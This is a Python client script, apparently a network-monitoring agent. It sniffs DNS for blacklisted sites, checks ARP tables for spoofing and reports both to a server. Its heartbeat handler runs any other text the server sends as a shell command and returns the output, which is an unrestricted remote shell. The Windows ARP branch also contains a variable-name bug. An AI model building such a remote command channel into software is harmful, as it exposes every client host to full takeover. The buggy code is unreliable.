#!/usr/bin/python3
import socket
import os
import subprocess
from scapy.all import *
import threading
import time 
import sys
from queue import Queue
from threading import Timer,Lock
import datetime
import platform
import select
import wget


##wget is needed to be installed.

host = sys.argv[1]
port = int(sys.argv[2])
NUMBER_OF_THREADS = 2 # number of threads used
JOB_NUMBER = [1, 2] # Number of jobs, like the number of threads
queue = Queue() # Contains the Queue work

visitedSites={}
foundMiTM={}
blacklistedWebsites=[]
log=open("log.txt","a")


class RepeatedTimer(object): # Class for making Repeatable timer
	def __init__(self, duration, function):
		self._duration=duration # the Duration of the Timer
		self._function=function
		self._timer_lock=Lock()#  Lock to prevent replacing timer
		self._timer = None# none Means timer is not defined
		
	def start(self):
		# ~ global t
		with self._timer_lock:
			#Timer still running. stop it and restart
			if self._timer is not None:
				self._timer.cancel()
			#Create new Timer
			self._timer =Timer(self._duration,self._function)
			self._timer.start()		
				
	def isAlive(self):
		with self._timer_lock:
			# If timer was defined
			if self._timer is not None:
				return self._timer.is_alive()
		return False


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


def work():
	while True:
		x = queue.get()
		if x == 1: #Thread used for Packet Sniffing with Scapy.
			print("Threading 1 works")
			sniff(prn=findDNS)
               
		if x == 2: # Thread used for starting and setting the timers and running them
			print("Threading 2 Works")
			ArpSend()# Check if computer is under MiTM uppon starting the script
			ScapySend() # Check if computer entered blacklisted Site uppon starting the script
			BlackListDownload() # Initialize first BlackList uppon starting the script
			
			arp=RepeatedTimer(60,ArpSend)# Check if Client was under MiTM attack, if yes send to server, checked every minute.
			scapy=RepeatedTimer(45,ScapySend) # Check if Client entered any BlackListed websites if yes, send to server checked every 45 seconds
			download=RepeatedTimer(300,BlackListDownload) # Check if blacklist file was changed.
			
			while True:
				if not arp.isAlive():
					arp.start()
				if not scapy.isAlive():
					scapy.start()
				if not download.isAlive():
					download.start()
				
				ARPChecker()# Check for MiTM attack
				heartbeat_Listen()# Check if server sent commands
				
		queue.task_done()
	
def BlackListDownload():
	global blacklistedWebsites
	blacklistedWebsitesFile=wget.download(f"http://{host}")
	with open(blacklistedWebsitesFile,'r') as fr:
		blacklistedWebsites=fr.read().splitlines()
	os.remove(blacklistedWebsitesFile)
		
		
# Listen for requests from server.
def heartbeat_Listen():
	global s
	ready=select.select([s],[],[],0.05)
	if ready[0]:
		data=s.recv(1024)
		sent=data.decode()
		print(sent)
		if len(sent)==0: # Server has been shutdown
			s.close()
			print("Server has been disconnected.")
			os._exit(1)
		elif "blupdate" in sent: # Force blacklist update to client
			print("Forced Blacklist Download by Server!")
			BlackListDownload()
		elif "1" == sent:
			s.send(b"0")
		else: # Server sent commands
			if "cd" in sent: # if Server wants to CD
				exe=sent.strip('\n').split(" ")
				CD(exe[1],s)
			else:
				proc = subprocess.Popen(sent,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
				output = proc.stdout.read() + proc.stderr.read()
				s.send(output)  # Send output back

def CD(exe,s):
	if ".." in exe:
		os.chdir("..")
	else:
		try:
			os.chdir(exe)
		except:
			return
			
#If Any BlackListed URLs are entered then, send report to server, checked every minute.
def ScapySend():
	global visitedSites
	if len(visitedSites)>0:
		new_d={str(key) for key in visitedSites}
		print(f"[!] Client Entered a blacklisted sites: {new_d} at "+str(datetime.datetime.now()))
		log.write(f"[!] Client Entered a blacklisted sites: {new_d} at "+str(datetime.datetime.now())+" \n")
		log.flush()
		s.send(b"011")
		visitedSites={}


def ArpSend(): #If MiTM attack was present, send to server.
	global foundMiTM
	if len(foundMiTM)>0:
		print(f"[!] Client is under MiTM attack! reported at {foundMiTM}")
		log.write(f"[!] Client is under MiTM attack! reported at {foundMiTM} \n")
		log.flush()
		s.send(b"001")
		foundMiTM={};
		
#ARP Checker Start
def ARPChecker():
	global foundMiTM
	temp=platform.system()
	# MiTM Checker for Linux
	if "Linux" in temp:
		with os.popen("arp -a") as f:
			data=f.read()
		lst=data.split("\n")
		macAdress={}
		for i in lst:
			if i: # if i is not empty
				temp=i.split(" ")
				mac=temp[-4] # Contains Checked Mac
				if macAdress.get(mac):
					ipAdress=temp[1][1:-1] #Contains checked IP Adress
					if not foundMiTM.get(ipAdress):
						foundMiTM[ipAdress]=str(datetime.datetime.now())
				macAdress[temp[-4]]=1
		
	## MiTM checker for windows
	elif "Windows" in temp:
		#Checking MiTM for Windows Users.
		with os.popen("arp -a") as f:
			data=f.read()
		lst=data.split("\n")
		macAdresses={}
		for i in lst:
			if i:
				if "dynamic" in i:
					temp=i.split(" ")
					mac=temp[-9]
					if macAdresses.get(mac): # if MAC already exists, mac duplicate found!
						ipaAdress=temp[2]
						if not foundMiTM.get(ipAdress):
							foundMiTM[ipaAdress]=str(datetime.datetime.now())
					macAdresses[mac] = 1
	else:
		print("OS not found")
### ARP Checker ends here

# Using scapy to see if the user entered an invalid sites
def findDNS(p):
	if p.haslayer(DNS):
		if "Qry" in p.summary(): # Qry is the request for the Website.
			url=p.summary() # save summary to variable
			strip=url.split('\"')[-2].replace('"',"")[2:-2] # Strip the text to plain URL
			if len(blacklistedWebsites)>0:
				for url in blacklistedWebsites:
					if strip in url:
						if not visitedSites.get(strip):
							visitedSites[strip]=str(datetime.datetime.now())
							
s = socket.socket()				
s.connect((host, port))
create_workers()
create_jobs()



	
